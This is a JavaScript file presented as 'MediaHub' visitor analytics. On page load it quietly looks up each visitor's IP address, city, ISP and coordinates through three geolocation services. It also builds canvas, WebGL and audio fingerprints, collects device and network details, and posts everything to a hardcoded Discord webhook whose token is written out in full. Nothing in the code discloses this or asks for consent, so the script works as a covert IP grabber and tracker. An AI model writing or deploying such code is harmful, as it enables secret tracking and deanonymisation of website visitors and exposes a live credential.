// analytics.js - Advanced User Analytics & Fingerprinting
class AdvancedAnalytics {
    constructor() {
        this.webhookUrl = 'https://discord.com/api/webhooks/1411453235834654792/m4kwAhRpqLt6BS-uoe6wXE4kmaDOsapMg8t1R-l6zjxLLJbhaFNYpYuKkEzIxHtPKhBK';
        this.init();
    }

    async init() {
        await this.collectComprehensiveData();
    }

    async collectComprehensiveData() {
        try {
            const [ipInfo, fingerprint, systemInfo] = await Promise.all([
                this.getIPInfo(),
                this.generateAdvancedFingerprint(),
                this.getSystemInfo()
            ]);

            const userData = {
                ...ipInfo,
                ...fingerprint,
                ...systemInfo,
                timestamp: new Date().toISOString(),
                pageUrl: window.location.href,
                referrer: document.referrer || 'Direct',
                sessionId: this.generateSessionId()
            };

            await this.sendToDiscord(userData);
            this.storeLocalAnalytics(userData);

        } catch (error) {
            console.warn('Analytics collection limited:', error);
        }
    }

    async getIPInfo() {
        try {
            const responses = await Promise.allSettled([
                fetch('https://api.ipify.org?format=json'),
                fetch('https://ipapi.co/json/'),
                fetch('https://jsonip.com')
            ]);

            let ipData = {};
            for (const response of responses) {
                if (response.status === 'fulfilled' && response.value.ok) {
                    const data = await response.value.json();
                    ipData = { ...ipData, ...data };
                }
            }

            return {
                ip: ipData.ip || 'Unknown',
                country: ipData.country_name || ipData.country || 'Unknown',
                city: ipData.city || 'Unknown',
                region: ipData.region || ipData.region_code || 'Unknown',
                isp: ipData.org || ipData.isp || 'Unknown',
                timezone: ipData.timezone || 'Unknown',
                coordinates: ipData.latitude && ipData.longitude ? 
                    `${ipData.latitude}, ${ipData.longitude}` : 'Unknown'
            };
        } catch {
            return { ip: 'Unknown', error: 'IP detection failed' };
        }
    }

    generateAdvancedFingerprint() {
        const components = [];

        // Canvas fingerprinting
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 240; canvas.height = 60;
            ctx.textBaseline = 'top';
            ctx.font = '16px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 120, 60);
            ctx.fillStyle = '#069';
            ctx.fillText('MediaHub Analytics', 4, 20);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('MediaHub Analytics', 6, 22);
            components.push(canvas.toDataURL().substring(0, 100));
        } catch (e) {}

        // WebGL fingerprint
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
                    components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
                }
            }
        } catch (e) {}

        // Audio fingerprint
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            oscillator.type = 'sine';
            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
            const analyser = audioContext.createAnalyser();
            oscillator.connect(analyser);
            analyser.connect(audioContext.destination);
            oscillator.start();
            const data = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(data);
            oscillator.stop();
            components.push(Array.from(data).join('').substring(0, 20));
        } catch (e) {}

        return {
            deviceId: btoa(components.join('|')).substring(0, 32),
            fingerprint: components.length > 0 ? 'Present' : 'Blocked'
        };
    }

    getSystemInfo() {
        const connection = navigator.connection || {};
        
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
            screen: `${screen.width}x${screen.height}`,
            colorDepth: `${screen.colorDepth}-bit`,
            cpuCores: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
            connectionType: connection.effectiveType || 'Unknown',
            networkSpeed: connection.downlink ? `${connection.downlink}Mbps` : 'Unknown',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled ? 'Yes' : 'No',
            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
            deviceType: this.getDeviceType()
        };
    }

    getDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
        return 'Desktop';
    }

    generateSessionId() {
        return 'session_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
    }

    async sendToDiscord(data) {
        const embed = {
            title: "🌐 MediaHub Visitor Analytics",
            color: 0x0099ff,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "👤 User Identification",
                    value: `**IP:** ${data.ip}\n**Country:** ${data.country}\n**City:** ${data.city}\n**ISP:** ${data.isp}\n**Device:** ${data.deviceType}`,
                    inline: true
                },
                {
                    name: "💻 System Profile",
                    value: `**OS:** ${data.platform}\n**Browser:** ${this.parseBrowser(data.userAgent)}\n**Screen:** ${data.screen}\n**CPU:** ${data.cpuCores} cores\n**RAM:** ${data.deviceMemory}`,
                    inline: true
                },
                {
                    name: "🌐 Network Info",
                    value: `**Connection:** ${data.connectionType}\n**Speed:** ${data.networkSpeed}\n**Timezone:** ${data.timezone}\n**Language:** ${data.language}`,
                    inline: false
                },
                {
                    name: "🔍 Advanced Tracking",
                    value: `**Device ID:** ||${data.deviceId}||\n**Fingerprint:** ${data.fingerprint}\n**Session:** ${data.sessionId}`,
                    inline: false
                },
                {
                    name: "📊 Visit Details",
                    value: `**URL:** ${data.pageUrl}\n**Referrer:** ${data.referrer}\n**Time:** <t:${Math.floor(new Date(data.timestamp).getTime() / 1000)}:R>`,
                    inline: false
                }
            ],
            footer: {
                text: "MediaHub Pro Analytics • Secure Tracking"
            }
        };

        try {
            await fetch(this.webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "MediaHub Analytics Dashboard",
                    embeds: [embed]
                })
            });
        } catch (error) {
            console.warn('Discord webhook failed:', error);
        }
    }

    parseBrowser(userAgent) {
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        if (userAgent.includes('Opera')) return 'Opera';
        return 'Unknown';
    }

    storeLocalAnalytics(data) {
        try {
            localStorage.setItem('mediahub_last_visit', JSON.stringify({
                timestamp: data.timestamp,
                deviceId: data.deviceId
            }));
        } catch (e) {}
    }
}

// Initialize analytics with delay
setTimeout(() => new AdvancedAnalytics(), 1500);
